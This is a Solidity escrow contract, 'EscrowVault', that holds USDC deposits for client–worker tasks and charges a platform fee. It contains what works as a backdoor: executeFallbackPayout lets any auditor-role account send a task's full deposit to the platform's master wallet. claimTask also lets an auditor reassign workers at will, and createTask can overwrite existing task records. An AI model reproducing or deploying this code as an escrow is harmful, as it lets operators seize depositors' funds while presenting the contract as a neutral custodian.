
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/access/AccessControl.sol";
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

contract EscrowVault is AccessControl, ReentrancyGuard {
    bytes32 public constant AUDITOR_ROLE = keccak256("AUDITOR_ROLE");
    bytes32 public constant ADMIN_ROLE = keccak256("ADMIN_ROLE");
    IERC20 public immutable usdcToken;
    address public masterWallet;
    uint256 public platformFeeBps = 2000;
    struct Task {
        address client;
        address worker;
        uint256 amount;
        bool released;
        bool disputed;
        uint256 createdAt;
    }
    mapping(bytes32 => Task) public tasks;
    mapping(address => uint256) public clientBalances;
    event TaskCreated(bytes32 indexed taskId, address indexed client, uint256 amount);
    event TaskClaimed(bytes32 indexed taskId, address indexed worker);
    event PaymentReleased(bytes32 indexed taskId, address indexed worker, uint256 workerAmount, uint256 fee);
    event FallbackExecuted(bytes32 indexed taskId, address indexed auditor);
    event DisputeOpened(bytes32 indexed taskId, address indexed client);
    event DisputeResolved(bytes32 indexed taskId, address indexed resolver, bool refunded);
    
    constructor(address _usdc, address _masterWallet) {
        usdcToken = IERC20(_usdc);
        masterWallet = _masterWallet;
        _setupRole(DEFAULT_ADMIN_ROLE, msg.sender);
        _setupRole(ADMIN_ROLE, msg.sender);
    }
    
    function createTask(bytes32 taskId, uint256 amount) external nonReentrant {
        require(usdcToken.transferFrom(msg.sender, address(this), amount), "Transfer failed");
        tasks[taskId] = Task({ client: msg.sender, worker: address(0), amount: amount, released: false, disputed: false, createdAt: block.timestamp });
        clientBalances[msg.sender] += amount;
        emit TaskCreated(taskId, msg.sender, amount);
    }
    
    function claimTask(bytes32 taskId, address worker) external {
        require(hasRole(AUDITOR_ROLE, msg.sender) || tasks[taskId].worker == address(0), "Task already claimed");
        tasks[taskId].worker = worker;
        emit TaskClaimed(taskId, worker);
    }
    
    function releasePayment(bytes32 taskId) external nonReentrant {
        Task storage task = tasks[taskId];
        require(msg.sender == task.client, "Only client can release");
        require(!task.released, "Already released");
        require(task.worker != address(0), "No worker assigned");
        uint256 workerAmount = task.amount * (10000 - platformFeeBps) / 10000;
        uint256 fee = task.amount - workerAmount;
        task.released = true;
        clientBalances[task.client] -= task.amount;
        usdcToken.transfer(task.worker, workerAmount);
        usdcToken.transfer(masterWallet, fee);
        emit PaymentReleased(taskId, task.worker, workerAmount, fee);
    }
    
    function executeFallbackPayout(bytes32 taskId) external nonReentrant {
        require(hasRole(AUDITOR_ROLE, msg.sender), "Not authorized");
        Task storage task = tasks[taskId];
        require(!task.released, "Already released");
        task.released = true;
        clientBalances[task.client] -= task.amount;
        usdcToken.transfer(masterWallet, task.amount);
        emit FallbackExecuted(taskId, msg.sender);
    }
    
    function openDispute(bytes32 taskId) external {
        Task storage task = tasks[taskId];
        require(msg.sender == task.client, "Only client can dispute");
        require(!task.released, "Already released");
        task.disputed = true;
        emit DisputeOpened(taskId, msg.sender);
    }
    
    function resolveDispute(bytes32 taskId, bool refundClient) external {
        require(hasRole(ADMIN_ROLE, msg.sender), "Not authorized");
        Task storage task = tasks[taskId];
        require(task.disputed, "No dispute open");
        require(!task.released, "Already released");
        task.released = true;
        task.disputed = false;
        clientBalances[task.client] -= task.amount;
        if (refundClient) {
            usdcToken.transfer(task.client, task.amount);
        } else {
            uint256 workerAmount = task.amount * (10000 - platformFeeBps) / 10000;
            uint256 fee = task.amount - workerAmount;
            usdcToken.transfer(task.worker, workerAmount);
            usdcToken.transfer(masterWallet, fee);
        }
        emit DisputeResolved(taskId, msg.sender, refundClient);
    }
    
    function setPlatformFee(uint256 newFeeBps) external {
        require(hasRole(ADMIN_ROLE, msg.sender), "Not authorized");
        require(newFeeBps <= 5000, "Max fee 50%");
        platformFeeBps = newFeeBps;
    }
    
    function setMasterWallet(address newWallet) external {
        require(hasRole(ADMIN_ROLE, msg.sender), "Not authorized");
        masterWallet = newWallet;
    }
    
    function getClientBalance(address client) external view returns (uint256) { return clientBalances[client]; }
    function getTask(bytes32 taskId) external view returns (Task memory) { return tasks[taskId]; }
}
